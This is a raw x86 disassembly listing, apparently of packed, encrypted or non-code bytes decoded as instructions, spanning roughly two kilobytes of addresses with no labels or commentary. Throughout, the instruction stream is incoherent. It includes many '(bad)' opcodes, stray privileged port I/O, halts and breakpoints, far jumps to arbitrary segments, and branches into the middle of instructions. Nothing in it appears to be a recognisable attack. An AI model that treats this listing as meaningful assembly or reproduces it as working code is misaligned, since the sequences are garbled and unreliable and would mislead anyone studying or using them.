  420cff:	mov    ebx,0x7d9e38a2
  420d04:	push   edi
  420d05:	sahf   
  420d06:	int3   
  420d07:	fisttp DWORD PTR [edx+0x521fb07b]
  420d0d:	outs   dx,DWORD PTR ds:[esi]
  420d0e:	ins    BYTE PTR es:[edi],dx
  420d0f:	aad    0xc8
  420d11:	xor    al,0xa8
  420d13:	test   al,0x77
  420d15:	retf   0xbbe
  420d18:	call   0x74f7:0x1984bd25
  420d1f:	jo     0x420d3a
  420d21:	fisubr DWORD PTR [ebp+ecx*4-0x68]
  420d25:	xchg   esp,eax
  420d26:	ss leave 
  420d28:	mov    edi,0xab97c27f
  420d2d:	dec    ebx
  420d2e:	sbb    al,0x7f
  420d30:	inc    ebp
  420d31:	into   
  420d32:	dec    edi
  420d33:	out    0x44,eax
  420d35:	push   ebp
  420d36:	loop   0x420ce7
  420d38:	loop   0x420d46
  420d3a:	monitor 
  420d3d:	sub    al,0x89
  420d3f:	mov    eax,0x2dcc5e9
  420d44:	push   edi
  420d45:	loopne 0x420cf1
  420d47:	pop    DWORD PTR [ebp+0x13d7abd9]
  420d4d:	dec    esp
  420d4e:	gs lahf 
  420d50:	mov    eax,0x36683a9a
  420d55:	mov    esp,0x87bb197b
  420d5a:	fsub   QWORD PTR [eax+0x10]
  420d5d:	outs   dx,BYTE PTR ds:[esi]
  420d5e:	push   esp
  420d5f:	enter  0xd8e8,0x70
  420d63:	nop
  420d64:	pop    edx
  420d65:	lahf   
  420d66:	popf   
  420d67:	jae    0x420d9f
  420d69:	sbb    dl,BYTE PTR [esi]
  420d6b:	dec    BYTE PTR [esi+0x21]
  420d6e:	aad    0x8d
  420d70:	int3   
  420d71:	loope  0x420ded
  420d73:	push   0x900b4697
  420d78:	mov    BYTE PTR [edi],cl
  420d7a:	xor    ebp,DWORD PTR [edx]
  420d7c:	out    dx,al
  420d7d:	mul    BYTE PTR [eax-0x32]
  420d80:	adc    al,bh
  420d82:	lea    edi,[eax+0x119180a6]
  420d88:	push   esi
  420d89:	adc    BYTE PTR [ebx],0x95
  420d8c:	imul   BYTE PTR [esi-0x4c2841c7]
  420d92:	out    dx,al
  420d93:	bound  eax,QWORD PTR [edi+ebp*1+0x31]
  420d97:	cdq    
  420d98:	xor    BYTE PTR [esi+0x39],al
  420d9b:	push   eax
  420d9c:	test   BYTE PTR [edi+0x5aa8a453],bh
  420da2:	push   ds
  420da3:	xchg   BYTE PTR [ebx],al
  420da5:	xchg   BYTE PTR [eax],bl
  420da7:	mov    edx,0x7be37c42
  420dac:	mov    esi,0x4a3bc628
  420db1:	je     0x420dee
  420db3:	sub    ecx,DWORD PTR [eax-0x758cc580]
  420db9:	out    dx,al
  420dba:	or     eax,0xb7611226
  420dbf:	mov    eax,ss:0x70ffd306
  420dc5:	not    DWORD PTR [esi]
  420dc7:	and    BYTE PTR [esi],dl
  420dc9:	push   ebx
  420dca:	push   ds
  420dcb:	jmp    0x21668692
  420dd0:	out    0xa6,eax
  420dd2:	addr16 sub al,ah
  420dd5:	jmp    0x420e4c
  420dd7:	sub    al,0x19
  420dd9:	sti    
  420dda:	xchg   ebp,eax
  420ddb:	xor    eax,DWORD PTR [ebp+0x79]
  420dde:	or     eax,0xc146db71
  420de3:	pusha  
  420de4:	sub    edi,DWORD PTR [edx+ebp*8-0x2]
  420de8:	push   ebx
  420de9:	cmc    
  420dea:	xor    DWORD PTR [esi],esi
  420dec:	out    0x96,eax
  420dee:	xchg   ebp,eax
  420def:	push   ss
  420df0:	jle    0x420d9d
  420df2:	mov    eax,es
  420df4:	xor    BYTE PTR [ecx-0x722aeebf],dh
  420dfa:	sbb    ah,cl
  420dfc:	sbb    ah,BYTE PTR [ecx-0x53337ea3]
  420e02:	out    0xfd,al
  420e04:	int3   
  420e05:	adc    DWORD PTR [edi],ebx
  420e07:	(bad)  
  420e08:	jmp    0x420e7c
  420e0a:	mov    esi,0xb7e759ac
  420e0f:	adc    ah,ah
  420e11:	cmp    cl,bh
  420e13:	jo     0x420dcb
  420e15:	ins    DWORD PTR es:[edi],dx
  420e16:	rcl    DWORD PTR [eax-0x28],cl
  420e19:	or     edx,DWORD PTR [edx-0x7b]
  420e1c:	mov    WORD PTR [edx-0x2e],?
  420e1f:	fnsave [eax-0x7e59009e]
  420e25:	sbb    dl,BYTE PTR [eax+ecx*1]
  420e28:	cmp    BYTE PTR ds:0xc60ca439,0xb9
  420e2f:	cmp    BYTE PTR [esi-0x1a],0x99
  420e33:	adc    DWORD PTR [esi-0x5747afda],eax
  420e39:	jo     0x420e14
  420e3b:	push   cs
  420e3c:	sub    ecx,DWORD PTR [ecx+0x788ab5b4]
  420e42:	push   eax
  420e43:	mov    eax,0xc0ec6e02
  420e48:	push   cs
  420e49:	mov    cl,dh
  420e4b:	sub    DWORD PTR [edx-0x18],esp
  420e4e:	fdiv   st(5),st
  420e50:	sub    DWORD PTR [edx-0x8],esi
  420e53:	into   
  420e54:	loope  0x420eb0
  420e56:	adc    bl,dh
  420e58:	pop    ss
  420e59:	in     al,0xf3
  420e5b:	call   0x75fb:0xe77c159f
  420e62:	int    0xef
  420e64:	rcr    DWORD PTR [ebx+0x23],0xbb
  420e68:	fwait
  420e69:	push   ecx
  420e6a:	jbe    0x420e16
  420e6c:	or     eax,0x73a88aeb
  420e71:	xchg   ebp,eax
  420e72:	mov    ecx,0x276237f7
  420e77:	int3   
  420e78:	inc    ebx
  420e79:	and    ebp,DWORD PTR [ecx]
  420e7b:	inc    eax
  420e7c:	loopne 0x420efa
  420e7e:	pop    ebx
  420e7f:	or     esp,DWORD PTR [ebx]
  420e81:	test   al,0x61
  420e83:	cli    
  420e84:	inc    ebx
  420e85:	call   0x2ec6e2c
  420e8a:	arpl   WORD PTR [eax-0x3383907d],si
  420e90:	daa    
  420e91:	xchg   DWORD PTR [eax+esi*2-0x45],ebx
  420e95:	(bad)  
  420e96:	sar    DWORD PTR [ecx],1
  420e98:	sub    al,dl
  420e9a:	xchg   DWORD PTR [eax-0x1d],esi
  420e9d:	adc    edx,ebx
  420e9f:	popa   
  420ea0:	jg     0x420eed
  420ea2:	repnz xchg ebx,eax
  420ea4:	hlt    
  420ea5:	sub    al,0xa5
  420ea7:	out    0x20,al
  420ea9:	cli    
  420eaa:	push   ds
  420eab:	jne    0x420eb0
  420ead:	das    
  420eae:	sti    
  420eaf:	xchg   ebp,eax
  420eb0:	xor    cl,BYTE PTR gs:[ecx+0x7f]
  420eb4:	cmp    esi,DWORD PTR [edi-0x7c73d998]
  420eba:	icebp  
  420ebb:	pop    es
  420ebc:	dec    ecx
  420ebd:	add    dl,BYTE PTR [esi-0x193b6411]
  420ec3:	outs   dx,BYTE PTR ds:[esi]
  420ec4:	sti    
  420ec5:	cmp    DWORD PTR [eax+0x308da517],0x6450c33d
  420ecf:	mov    ds:0x740415ed,eax
  420ed4:	lea    edi,[esi-0x67f20d03]
  420eda:	xor    ebp,DWORD PTR [ebp-0x7f977808]
  420ee0:	push   ebp
  420ee1:	mov    eax,ds:0x1de20332
  420ee6:	stos   BYTE PTR es:[edi],al
  420ee7:	xor    BYTE PTR [ecx],al
  420ee9:	add    dh,BYTE PTR ds:0xc5d19f3
  420eef:	add    al,0x6f
  420ef1:	jno    0x420eb8
  420ef3:	ret    0x1fa5
  420ef6:	pop    edx
  420ef7:	inc    edi
  420ef8:	sub    cl,0xf4
  420efb:	jecxz  0x420ef1
  420efd:	imul   eax,edi,0x38
  420f00:	popf   
  420f01:	cmp    BYTE PTR [ecx-0x5a],dh
  420f04:	lds    eax,FWORD PTR [ecx+edx*8-0x5b11f9ba]
  420f0b:	mov    eax,ds:0xdb4eef93
  420f10:	shl    DWORD PTR [edi+0x4b],1
  420f13:	(bad)  
  420f14:	dec    ebx
  420f15:	mov    bl,0x58
  420f17:	pop    edi
  420f18:	shr    ebp,0x3f
  420f1b:	je     0x420eb8
  420f1d:	mov    eax,ds:0x5a483491
  420f22:	cmp    BYTE PTR [ebx+0x5cb12bef],dl
  420f28:	dec    edx
  420f29:	and    DWORD PTR [eax-0x360c7539],edx
  420f2f:	(bad)  
  420f30:	push   ebp
  420f31:	mov    BYTE PTR [ecx+0xe],bh
  420f34:	xor    al,0xc3
  420f36:	xchg   ebp,eax
  420f37:	or     al,0x52
  420f39:	clc    
  420f3a:	xor    bh,BYTE PTR [eax]
  420f3c:	mov    al,ds:0xf84f228f
  420f41:	fucom  st(0)
  420f43:	cld    
  420f44:	jns    0x420f82
  420f46:	(bad)  
  420f47:	adc    BYTE PTR [edi],dl
  420f49:	jmp    0x6517:0x2e049437
  420f50:	retf   
  420f51:	(bad)  
  420f52:	test   eax,0x5a8304d7
  420f57:	pushf  
  420f58:	xlat   BYTE PTR ds:[ebx]
  420f59:	or     eax,0x171176ef
  420f5e:	bts    ecx,esp
  420f61:	or     ah,BYTE PTR [edi+0x1f6893fd]
  420f67:	into   
  420f68:	adc    cl,BYTE PTR [eax]
  420f6a:	(bad)  
  420f6b:	hlt    
  420f6c:	out    0xfb,al
  420f6e:	int    0x43
  420f70:	retf   
  420f71:	mov    eax,DWORD PTR [edx+esi*4]
  420f74:	popf   
  420f75:	jl     0x420f3a
  420f77:	jbe    0x420fd2
  420f79:	or     ecx,DWORD PTR [esi+0x3a]
  420f7c:	mov    edi,DWORD PTR [esi+0x5]
  420f7f:	sahf   
  420f80:	fwait
  420f81:	or     esi,0x49e0392f
  420f87:	xchg   ebx,eax
  420f88:	mov    esp,0x2a3ed518
  420f8d:	in     al,0x60
  420f8f:	(bad)  
  420f90:	pop    esp
  420f91:	adc    al,0xce
  420f93:	shl    DWORD PTR [edi+0xcc9f72d],0x37
  420f9a:	or     BYTE PTR [edi+0xa7e34de],0x21
  420fa1:	les    ecx,FWORD PTR [edx+0x8]
  420fa4:	jno    0x420fde
  420fa6:	ret    0x2dfd
  420fa9:	pop    ecx
  420faa:	jnp    0x42100d
  420fac:	inc    ebx
  420fad:	sbb    al,0x23
  420faf:	dec    ecx
  420fb0:	adc    ebx,DWORD PTR [eax]
  420fb2:	in     al,dx
  420fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fb4:	mov    dl,0x7c
  420fb6:	out    0x58,al
  420fb8:	out    0xac,al
  420fba:	xchg   BYTE PTR [eax+0x63],dh
  420fbd:	push   0x6
  420fbf:	jecxz  0x42100e
  420fc1:	nop
  420fc2:	sub    esp,DWORD PTR [ebp+0x6a7471a]
  420fc8:	pop    es
  420fc9:	mov    ebx,edx
  420fcb:	xor    BYTE PTR [esi],al
  420fcd:	push   ebx
  420fce:	or     BYTE PTR [esi-0x73],cl
  420fd1:	(bad)  
  420fd3:	mov    ebp,0x87096c9f
  420fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fd9:	dec    esp
  420fda:	pop    ds
  420fdb:	inc    ebx
  420fdc:	ds dec esi
  420fde:	sub    al,0x21
  420fe0:	fidivr WORD PTR [ebx+0x7a]
  420fe3:	jne    0x420fdf
  420fe5:	lods   al,BYTE PTR ds:[esi]
  420fe6:	cmp    ecx,DWORD PTR [ecx]
  420fe8:	cmp    DWORD PTR ds:0x97f4cd8e,eax
  420fee:	jmp    0xf72420cf
  420ff3:	dec    ecx
  420ff4:	test   ecx,eax
  420ff6:	ficom  WORD PTR [eax+0x57]
  420ff9:	xor    al,0xf2
  420ffb:	and    eax,0x2d0d73
  421000:	nop
  421001:	sub    ebx,edx
  421003:	add    bl,BYTE PTR [esi+eiz*1]
  421006:	dec    eax
  421007:	(bad)  
  421008:	mov    BYTE PTR [ebp-0x580004cf],al
  42100e:	imul   ebp,DWORD PTR [esi],0x79411405
  421014:	out    dx,eax
  421015:	ret    
  421016:	daa    
  421017:	xor    BYTE PTR [ebx],cl
  421019:	mov    WORD PTR [ebx+0x4a],ds
  42101c:	jmp    DWORD PTR [esi]
  42101e:	or     eax,0xea01a5f
  421023:	inc    eax
  421024:	cli    
  421025:	and    edx,DWORD PTR [ebx-0x1a]
  421028:	and    al,0x71
  42102a:	push   0xe45e520a
  42102f:	fsub   st(7),st
  421031:	call   0x7619:0x6986d2e0
  421038:	inc    ecx
  421039:	mov    bh,0x3d
  42103b:	imul   ecx,DWORD PTR [edi-0x60c584fe],0x729f4ef5
  421045:	cmp    bh,BYTE PTR [ebx+0x5b3f2f9d]
  42104b:	cdq    
  42104c:	ror    DWORD PTR [eax-0x5b280170],0xc7
  421053:	or     ch,0x5b
  421056:	pop    ds
  421057:	xor    BYTE PTR [edx],0xe6
  42105a:	aad    0x8d
  42105c:	xchg   DWORD PTR [esi-0x7],eax
  42105f:	push   esp
  421060:	adc    dl,cl
  421062:	xor    dl,dl
  421064:	mov    BYTE PTR [eax+0x4f76a8d3],ah
  42106a:	leave  
  42106b:	mov    edi,0x4ba8b59
  421070:	leave  
  421071:	in     eax,dx
  421072:	int    0x7c
  421074:	rep movs DWORD PTR es:[di],DWORD PTR ds:[si]
  421077:	mov    bl,0x16
  421079:	push   ecx
  42107a:	clc    
  42107b:	(bad)
  42107f:	and    ch,cl
  421081:	mov    BYTE PTR [esi+0x22],dl
  421084:	sub    BYTE PTR [esi+esi*8-0x3e],0xac
  421089:	jecxz  0x42106f
  42108b:	xchg   ebx,eax
  42108c:	enter  0xe7dc,0x90
  421090:	hlt    
  421091:	in     al,dx
  421092:	mov    esi,0xa8c8f4df
  421097:	xchg   esp,eax
  421098:	push   esi
  421099:	cmp    al,0x92
  42109b:	ss ins BYTE PTR es:[edi],dx
  42109d:	pop    ecx
  42109e:	and    eax,DWORD PTR [ebp-0x1c]
  4210a1:	or     DWORD PTR [esi+0x4e3f509],edx
  4210a7:	int    0xb6
  4210a9:	fs jmp 0x4210b9
  4210ac:	aaa    
  4210ad:	mov    DWORD PTR [ebx+ebx*4],esp
  4210b0:	das    
  4210b1:	add    DWORD PTR [ebx-0x1e],esi
  4210b4:	mov    ah,0x64
  4210b6:	pushf  
  4210b7:	mov    ebx,DWORD PTR [ebx]
  4210b9:	enter  0x8d62,0xeb
  4210bd:	inc    edx
  4210be:	bound  edx,QWORD PTR [esi]
  4210c0:	hlt    
  4210c1:	int3   
  4210c2:	push   cs
  4210c3:	adc    DWORD PTR [ecx-0x4f],esp
  4210c6:	and    eax,0x28324635
  4210cb:	xlat   BYTE PTR ds:[ebx]
  4210cc:	jge    0x4210ac
  4210ce:	(bad)  
  4210cf:	les    eax,FWORD PTR [edi+0x63]
  4210d2:	or     DWORD PTR [edi],ebp
  4210d4:	sar    DWORD PTR [eax],cl
  4210d6:	(bad)  
  4210d7:	adc    eax,DWORD PTR [ecx+0x5b4240c0]
  4210dd:	xlat   BYTE PTR ds:[ebx]
  4210de:	jnp    0x4210ea
  4210e0:	retf   
  4210e1:	dec    ebp
  4210e2:	call   0x47b7:0x7b5de454
  4210e9:	stos   DWORD PTR es:[edi],eax
  4210ea:	and    eax,0xbad75a76
  4210ef:	(bad)  
  4210f0:	xchg   esp,eax
  4210f1:	in     al,0x89
  4210f3:	jle    0x421158
  4210f5:	mov    ah,0x87
  4210f7:	inc    ecx
  4210f8:	mov    ?,WORD PTR [ebx-0x35de7783]
  4210fe:	mov    ebp,0xc095ac68
  421103:	mov    WORD PTR [edx],es
  421105:	mov    ch,0xfc
  421107:	xchg   edi,esp
  421109:	push   eax
  42110a:	mov    ch,0x39
  42110c:	mov    ecx,0x4f63345e
  421111:	push   cs
  421112:	pop    esp
  421113:	fcom   st(6)
  421115:	arpl   WORD PTR [edx+0x530d6bdd],dx
  42111b:	mov    edx,0xbde3a88a
  421120:	int    0xb1
  421122:	test   al,0x56
  421124:	dec    edi
  421125:	(bad)  
  421126:	in     al,dx
  421127:	icebp  
  421128:	in     al,dx
  421129:	xchg   ebx,eax
  42112a:	stc    
  42112b:	frstor [edx+0x4ebd48d1]
  421131:	pop    esi
  421132:	and    eax,0x3c6d740c
  421137:	daa    
  421138:	clc    
  421139:	pop    ss
  42113a:	add    eax,0xbab9a981
  42113f:	call   0x43ec0b09
  421144:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421146:	jbe    0x4210fa
  421148:	retf   0x2616
  42114b:	bound  esp,QWORD PTR [esi-0x55e0067b]
  421151:	ins    BYTE PTR es:[edi],dx
  421152:	popa   
  421153:	nop
  421154:	dec    esi
  421155:	mov    bl,0xb0
  421157:	scas   eax,DWORD PTR es:[edi]
  421158:	sub    esp,DWORD PTR [ebx]
  42115a:	call   edi
  42115c:	dec    edi
  42115d:	mov    bh,0x1a
  42115f:	fbstp  TBYTE PTR [ecx]
  421161:	out    0x58,al
  421163:	pop    ecx
  421164:	mov    ds:0x882ae783,al
  421169:	pop    edx
  42116a:	hlt    
  42116b:	and    ecx,DWORD PTR [eax+edx*1+0x4e]
  42116f:	mov    ah,BYTE PTR ds:0x1b5bd8bc
  421175:	nop
  421176:	jge    0x421159
  421178:	jnp    0x42111e
  42117a:	pop    ebp
  42117b:	(bad)  
  42117e:	fidivr WORD PTR [edi-0x1a]
  421181:	cwde   
  421182:	inc    ebp
  421184:	add    bl,BYTE PTR [ebp-0x5f]
  421187:	pop    ebp
  421188:	inc    eax
  421189:	lock std 
  42118b:	lods   eax,DWORD PTR ds:[esi]
  42118c:	cmp    eax,DWORD PTR [esi-0x9]
  42118f:	jg     0x4211cc
  421191:	stc    
  421192:	cwde   
  421193:	xor    eax,0x344e0bd7
  421198:	mov    al,ds:0x551f0ad6
  42119d:	lods   al,BYTE PTR ds:[esi]
  42119e:	jno    0x42115b
  4211a0:	pop    ss
  4211a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a2:	sar    BYTE PTR [edi+edx*2],1
  4211a5:	add    eax,0xcfb0ba4
  4211aa:	icebp  
  4211ab:	ror    esp,1
  4211ad:	or     BYTE PTR [edx],bl
  4211af:	mov    ds:0x11ce35f5,al
  4211b4:	lds    ecx,FWORD PTR [edx+edi*4-0x50]
  4211b8:	pop    es
  4211b9:	je     0x421159
  4211bb:	std    
  4211bc:	mov    ch,0x66
  4211be:	ret    0x3d60
  4211c1:	xor    BYTE PTR [ebp-0x22],ch
  4211c4:	or     al,0xf1
  4211c6:	fwait
  4211c7:	xor    DWORD PTR [eax-0x1558766],0xf36edad9
  4211d1:	mov    bl,0x79
  4211d3:	cmp    bl,dl
  4211d5:	xor    bh,BYTE PTR [edi*2-0x681eeacb]
  4211dc:	sub    BYTE PTR [ecx-0x62],cl
  4211df:	push   cs
  4211e0:	push   cs
  4211e1:	jns    0x4211c1
  4211e3:	adc    ecx,DWORD PTR [ebx-0x35ff3d25]
  4211e9:	push   es
  4211ea:	outs   dx,BYTE PTR ds:[esi]
  4211eb:	inc    esp
  4211ec:	xchg   edi,eax
  4211ed:	ss fwait
  4211ef:	xchg   esi,eax
  4211f0:	loopne 0x421181
  4211f2:	ror    DWORD PTR [ecx],1
  4211f4:	mov    edx,0x5774d0f0
  4211f9:	mov    al,0xc
  4211fb:	outs   dx,BYTE PTR ds:[esi]
  4211fc:	arpl   WORD PTR [ebx+ebp*2-0x330c134f],sp
  421203:	mov    dl,0xb
  421205:	ins    BYTE PTR es:[edi],dx
  421206:	push   ebx
  421207:	push   edi
  421208:	addr16 cmp DWORD PTR [bx+si],ecx
  42120c:	arpl   WORD PTR ds:0x71236193,ax
  421212:	jae    0x421201
  421214:	jecxz  0x42120e
  421216:	mov    cl,0xd2
  421218:	fadd   QWORD PTR [eax]
  42121a:	loopne 0x4211fe
  42121c:	fidivr WORD PTR ds:0x8e83725a
  421222:	je     0x4211be
  421224:	mov    al,ds:0x2d578114
  421229:	sbb    DWORD PTR ds:0xa3d4fa92,ebp
  42122f:	pop    ebp
  421230:	jg     0x4212a9
  421232:	das    
  421233:	jnp    0x421204
  421235:	jmp    0xe907c761
  42123a:	ror    BYTE PTR [edx],1
  42123c:	aas    
  42123d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42123e:	arpl   WORD PTR [ebx-0x21e9250c],sp
  421244:	ja     0x421267
  421246:	dec    esi
  421247:	jns    0x4212c4
  421249:	ss or  al,0xe8
  42124c:	inc    esi
  42124d:	in     al,dx
  42124e:	fist   WORD PTR ds:0xadf16e16
  421254:	push   ebx
  421255:	call   0xd6c05c53
  42125a:	push   edx
  42125b:	dec    ecx
  42125c:	inc    esp
  42125d:	ficomp DWORD PTR [ebp-0x1c46b183]
  421263:	or     ch,0x9f
  421266:	js     0x42125a
  421268:	push   esi
  421269:	inc    eax
  42126b:	test   al,0x18
  42126d:	outs   dx,BYTE PTR ds:[esi]
  42126e:	lock aam 0x68
  421271:	cdq    
  421272:	(bad)  
  421273:	ss jmp 0xf55:0x1df56230
  42127b:	pop    ds
  42127c:	cmp    DWORD PTR [eax+0x31963149],edx
  421282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421283:	call   0x4c1a:0xef52532b
  42128a:	or     eax,0x89f70374
  42128f:	or     dh,ch
  421291:	sar    DWORD PTR [ebp-0x4ad2a5dc],1
  421297:	mov    esi,0x56ef0f35
  42129c:	sbb    ah,BYTE PTR [edi+0x4e]
  42129f:	aam    0xdb
  4212a1:	or     eax,esp
  4212a3:	mov    al,ds:0xd7b47f7f
  4212a8:	xor    ebp,DWORD PTR [edx-0x7cbad3a2]
  4212ae:	mov    ds:0x5db0bddb,eax
  4212b3:	dec    ebp
  4212b4:	lods   al,BYTE PTR ds:[esi]
  4212b5:	arpl   bp,di
  4212b7:	sbb    eax,0xfe7e086
  4212bc:	enter  0xbb68,0xa
  4212c0:	or     al,0xec
  4212c2:	dec    ecx
  4212c3:	pop    edi
  4212c4:	hlt    
  4212c5:	inc    ebx
  4212c6:	call   0x6cb5e705
  4212cb:	jge    0x421274
  4212cd:	outs   dx,DWORD PTR ds:[esi]
  4212ce:	sbb    eax,0xaea89805
  4212d3:	out    dx,al
  4212d4:	mov    al,ds:0xfd2773a2
  4212d9:	xchg   edi,eax
  4212da:	sub    DWORD PTR [ecx+0x513a50e3],ebx
  4212e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212e1:	enter  0x46aa,0x71
  4212e5:	(bad)  
  4212e6:	jmp    0x6ae43310
  4212eb:	dec    ebp
  4212ec:	add    eax,ebx
  4212ee:	les    edi,FWORD PTR [edi]
  4212f0:	mov    eax,0x58d6cb9a
  4212f5:	data16 fcomp QWORD PTR [edx]
  4212f8:	ret    
  4212f9:	inc    eax
  4212fa:	mov    ah,BYTE PTR [ebx-0x38]
  4212fd:	adc    BYTE PTR [edi],ch
  4212ff:	jle    0x421344
  421301:	sbb    dx,dx
  421304:	repz fwait
  421306:	push   cs
  421307:	test   ebx,0x9fffe3f0
  42130d:	jmp    0xa12e:0x666fbeb9
  421314:	gs test eax,0x79684e6c
  42131a:	cs je  0x4212fc
  42131d:	(bad)  
  42131e:	push   ss
  42131f:	pop    edx
  421320:	or     DWORD PTR [edx-0x39],edx
  421323:	jb     0x4212e8
  421325:	stos   DWORD PTR es:[edi],eax
  421326:	sbb    DWORD PTR [eax+0x47],edi
  421329:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42132b:	add    DWORD PTR [edi+eiz*2+0x2b],edi
  42132f:	push   esi
  421330:	stos   BYTE PTR es:[edi],al
  421331:	add    DWORD PTR [eax+0x7c0582d5],esi
  421337:	sub    dh,BYTE PTR [eax]
  421339:	add    DWORD PTR ds:0x1b03bd18,edi
  42133f:	add    eax,0xd6fecd0b
  421344:	dec    edx
  421345:	ret    0x93a1
  421348:	jb     0x4212ef
  42134a:	popf   
  42134b:	adc    esi,DWORD PTR [ebx+0x1f8e19b5]
  421351:	xchg   esp,eax
  421352:	jmp    0x16da4411
  421357:	fdivr  DWORD PTR ds:[ecx+ebx*4-0x4f]
  42135c:	fsubr  QWORD PTR [edi+0x4c]
  42135f:	add    cl,BYTE PTR [edx-0x5a]
  421362:	(bad)  
  421363:	mul    BYTE PTR [eax+0x2739fd5e]
  421369:	and    ch,BYTE PTR [edi+0x46ce77ea]
  42136f:	loope  0x421385
  421371:	sbb    BYTE PTR ds:0x72a387a2,ah
  421377:	test   DWORD PTR [edi-0x116bb175],esi
  42137d:	and    DWORD PTR [eax],edx
  42137f:	ja     0x4213cc
  421381:	jno    0x42134c
  421383:	jno    0x421345
  421385:	and    al,0x0
  421387:	imul   eax,eax,0xb08f505b
  42138d:	jmp    0x7087:0xff3f7b53
  421394:	mov    ebp,0x5b71d78
  421399:	inc    edx
  42139a:	or     DWORD PTR [ecx+0x79],edi
  42139d:	repz pop edx
  42139f:	or     ah,BYTE PTR [edx]
  4213a1:	mov    al,0xfa
  4213a3:	repnz mov DWORD PTR [eax],edi
  4213a6:	popf   
  4213a7:	sbb    DWORD PTR [esi-0xf],esp
  4213aa:	rcr    ah,0x5d
  4213ad:	push   edi
  4213ae:	jne    0x42141e
  4213b0:	mov    dh,0x97
  4213b2:	sbb    al,0x4c
  4213b4:	repnz xchg ecx,eax
  4213b6:	cdq    
  4213b7:	dec    edi
  4213b8:	xchg   ebp,eax
  4213b9:	dec    eax
  4213ba:	aas    
  4213bb:	push   ecx
  4213bc:	xchg   esp,eax
  4213bd:	jnp    0x421385
  4213bf:	test   BYTE PTR [ebp+0x205bab82],ch
  4213c5:	jge    0x421435
  4213c7:	dec    edx
  4213c8:	cmp    eax,0xa853d10c
  4213cd:	enter  0x62a1,0x2d
  4213d1:	jo     0x421438
  4213d3:	stos   BYTE PTR es:[edi],al
  4213d4:	arpl   WORD PTR [esp+eiz*4-0x4b],di
  4213d8:	rcr    DWORD PTR [edx-0x65],0x3b
  4213dc:	retf   0x8554
  4213df:	bound  ecx,QWORD PTR [ecx-0x24b22407]
  4213e5:	addr16 (bad) 
  4213e7:	mov    ds:0x3b57a676,al
  4213ec:	or     esi,ebx
  4213ee:	loopne 0x4213ff
  4213f0:	cmp    DWORD PTR [ebx-0x2ddf3e70],esi
  4213f6:	jp     0x421472
  4213f8:	push   ss
  4213f9:	shl    BYTE PTR [ebx+0x4280cc03],1
  4213ff:	dec    ecx
  421400:	in     eax,dx
  421401:	inc    ebp
  421402:	adc    esi,DWORD PTR [bx+di+0x129d]
  421407:	cmp    bh,BYTE PTR [edi]
  421409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42140a:	cmp    eax,0x3f50fd7b
  42140f:	sbb    al,0x68
  421411:	mov    ecx,0x83950f82
  421416:	xchg   ebp,eax
  421417:	aaa    
  421418:	into   
  421419:	retf   0x2ff3
  42141c:	scas   al,BYTE PTR es:[edi]
  42141d:	mov    eax,ds:0x7922f997
  421422:	dec    eax
  421423:	dec    edi
  421424:	cmp    BYTE PTR [eax-0x2051c503],dh
  42142a:	jecxz  0x421406
  42142c:	lock or edi,ebp
  42142f:	inc    edx
  421430:	mov    dh,0xaf
  421432:	jnp    0x4214a6
  421434:	out    dx,eax
  421435:	(bad)  
  421437:	ja     0x4213ed
  421439:	fidiv  DWORD PTR [ecx+0x3d]
  42143c:	shl    DWORD PTR [eax+0x17f96220],0xe6
  421443:	xchg   ebp,eax
  421444:	jmp    0x421497
  421446:	and    edx,ecx
  421448:	les    edx,FWORD PTR [ebx-0x21e7c1be]
  42144e:	(bad)  
  42144f:	std    
  421450:	(bad)  
  421451:	aam    0x6b
  421453:	mov    fs,WORD PTR [ebp+0x65]
  421456:	imul   esp,DWORD PTR [edi+0x6b3b436],0x2b
  42145d:	repnz jecxz 0x421409
  421460:	int3   
  421461:	les    esi,FWORD PTR [edi-0x12]
  421464:	sub    ebp,0x6e
  421467:	ins    DWORD PTR es:[edi],dx
  421468:	and    al,0xb8
  42146a:	inc    eax
  42146b:	iret   
  42146c:	add    DWORD PTR [esi+0x181ef254],ebx
  421472:	xor    BYTE PTR [ecx-0x64],0xe5
  421476:	mov    ?,ebp
  421478:	push   esp
  421479:	(bad)  
  42147c:	or     DWORD PTR [esi+edx*1],0xa9ef5ed6
  421483:	xor    eax,0xe7d7f49a
  421488:	sub    BYTE PTR [esi+0x67],al
  42148b:	inc    esi
  42148c:	popf   
  42148d:	repnz and al,0xa7
  421490:	clc    
  421491:	cld    
  421492:	in     eax,0x9e
  421494:	ds repz scas al,BYTE PTR es:[edi]
  421497:	je     0x4214e7
  421499:	mov    eax,0xff371595
  42149e:	cdq    
  42149f:	repnz sbb al,0xf9
  4214a2:	inc    ebx
  4214a3:	adc    al,0xb7
  4214a5:	adc    edx,DWORD PTR [edi-0x4f]
  4214a8:	ins    BYTE PTR es:[edi],dx
  4214a9:	das    
  4214aa:	sbb    eax,0xc5a95aab
  4214af:	out    dx,eax
  4214b0:	xchg   esp,eax
  4214b1:	rcl    DWORD PTR [ebp+ecx*1+0x61d20f27],cl
  4214b8:	stos   DWORD PTR es:[edi],eax
  4214b9:	out    0x87,al
  4214bb:	lock mov ebx,0x5ec3097f
  4214c1:	push   cs
  4214c2:	push   ebp
  4214c3:	or     al,0xe7
  4214c5:	bound  esp,QWORD PTR [eax]
  4214c7:	add    bl,0xad
  4214ca:	sti    
  4214cb:	sub    BYTE PTR [esi-0x7255afe],cl
  4214d1:	enter  0xbf4f,0x5c
  4214d5:	in     eax,dx
  4214d6:	mov    esi,0x9de98391
  4214db:	int3   
  4214dc:	jmp    0x36ef:0xd2f7bc11
  4214e3:	(bad)  
  4214e4:	cld    
  4214e5:	push   edi
  4214e6:	and    ecx,DWORD PTR ds:0x93845454
  4214ec:	push   DWORD PTR [edx+0x1f]
  4214ef:	fist   WORD PTR [ecx]
  4214f1:	sahf   
  4214f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214f3:	sub    al,0xeb
  4214f5:	pop    ss
  4214f6:	adc    dh,BYTE PTR [ebx]
  4214f8:	cmp    dh,ch
  4214fa:	inc    ebp
